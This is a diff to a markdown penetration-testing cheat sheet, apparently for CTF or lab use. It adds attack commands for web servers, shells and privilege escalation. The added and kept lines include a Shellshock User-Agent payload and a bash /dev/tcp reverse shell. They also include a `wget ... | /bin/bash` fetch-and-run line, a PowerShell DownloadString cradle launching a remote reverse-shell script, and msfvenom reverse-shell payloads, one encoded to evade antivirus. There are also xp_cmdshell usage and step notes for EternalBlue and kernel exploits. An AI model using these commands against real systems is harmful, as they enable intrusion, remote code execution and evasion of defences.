@@ -32,7 +32,15 @@
 #### Apache
 - Default log path
     - `/var/log/apache2/access.log`
+- Shell Shock
+    - Exist some path like `/cgi-bin/*.sh`
+    - Add `() { :;}; echo; /usr/bin/id` to User-Agent
+        - Must use Absolute path
 #### Nginx
+#### IIS
+- IIS 6.0
+    - [CVE-2017-7269](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269)
+        - Can only run once!!
 #### Tomcat
 - Tomcat Path
     - `/manager/status/all`
@@ -72,6 +80,7 @@
             print(result[1].text)
             break
     ```
+    - [File extension](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) 
 ### JSP / Tomcat
 - Webshell
     - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp
@@ -87,6 +96,11 @@
 - ASPX
 	- https://raw.githubusercontent.com/SecWiki/WebShell-2/master/Aspx/awen%20asp.net%20webshell.aspx
 	- https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx
+### CMS
+#### Wordpress
+- WPScan
+- Enum user
+    - `http://{ip}/index.php/?author=1`
 ## Shell
 ### Linux Shell
 - Find File
@@ -107,20 +121,25 @@
 - Bash tcp
     - `bash -c 'bash -i >& /dev/tcp/my_ip/7877 0>&1'`
     	- Write file in local first, and use wget/curl to get to victim machine
+    	- `/usr/bin/wget -O - {ip:port}/{file} | /bin/bash`
 - Make it moreinteractively
     - `python -c 'import pty; pty.spawn("/bin/bash")'`
 ### Reverse Shell - Windows
 - msfvenom
 	- https://infinitelogins.com/2020/01/25/sfvenom-reverse-shell-payload-cheatsheet/
+	    - stage : `shell/reverse_tcp `
+	        - msf `multi/handler` to receive
+	    - stageless : `shell_reverse_tcp`
+	        - `nc` to receive
 	- aspx
 		- `msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT}  -f aspx > shell.aspx`
-			- `nc` to receive
 		- `msfvenom -p windows/shell/reverse_tcp LHOST={IP} LPORT={PORT}  -f aspx > shell.aspx`
-			- msf `multi/handler` to receive
 	- exe
 		- `msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell-x86.exe`
-		- msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} -e x86/shikata_ga_nai -f exe > shell.ex
+		- `msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} -e x86/shikata_ga_nai -f exe > shell.exe`
 			- Anti-Anti-virus
+        - `msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT}  -f exe -o shellx64.exe`
+            - Most of time, x64 system can also run x86 shell
 - Powershell
 	- https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 	- `powershell iex (New-Object Net.WebClient).DownloadString('http://{my_ip}:{http_port}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {my_ip} -Port {shell_port}`
@@ -159,6 +178,7 @@
 			- In kali
 		- `expand {file.cab} -F:* {Extract path}`
 			- Extract path must be absolute path like `C:\Windows\Temp`
+- https://blog.ropnop.com/transferring-files-from-kali-to-windows/
 ## Server
 ### Redis
 - Write shell / file
@@ -179,6 +199,9 @@
 - Shell
 	- `exec xp_cmdshell '{Command}`
 ## Privilege - Linux
+### Kernel Exploit
+- [CVE-2017-16995](https://github.com/rlarabee/exploits/tree/master/cve-2017-16995)
+    - Test on Kernel 4.4.0
 ### Software
 - [GTFOBins](https://gtfobins.github.io/)
     - Linux privileges escalation 
@@ -251,7 +274,12 @@ Scan the system to find which can be use for privileges escalation
 ## Privilege - Windows
 ### Exploit
 - https://github.com/SecWiki/windows-kernel-exploits
-- [EternalBlue MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)
+- [EternalBlue MS17-010](https://github.com/helviojunior/MS17-010)
+    - Prepare msf reverse shell exe
+    - run `send_and_execute.py` 
+        - Maybe need to change username to `guest` 
+- [Cerrudo](https://github.com/Re4son/Churrasco)
+    - Windows Server 2003
 ### Bypass UAC
 - [CVE-2019-1388](http://blog.leanote.com/post/snowming/38069f423c76)
 ### Turn off Defender / Firewall
@@ -304,6 +332,9 @@ Scan the system to find which can be use for privileges escalation
 - rockyou.txt
 - https://github.com/danielmiessler/SecLists
 	- [xato-net-10-million-passwords-dup.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/xato-net-10-million-passwords-dup.txt)
+- Apache Tomcat
+    - `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt`
+    - `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt`
 ### Online
 - https://crackstation.net/
 
@@ -314,6 +345,8 @@ Scan the system to find which can be use for privileges escalation
 	- `ls`
 	- `get {file_name}`
 	- `put {file_name}`
+	- Download recursive 
+	    - `wget -r 'ftp://{ip}/{path}/'`
 ## Forensics
 - Unknown files
 	- `file {file_name}`
@@ -330,6 +363,4 @@ Scan the system to find which can be use for privileges escalation
 <!-- todo
 chisel
 XXE
-
-
 -->
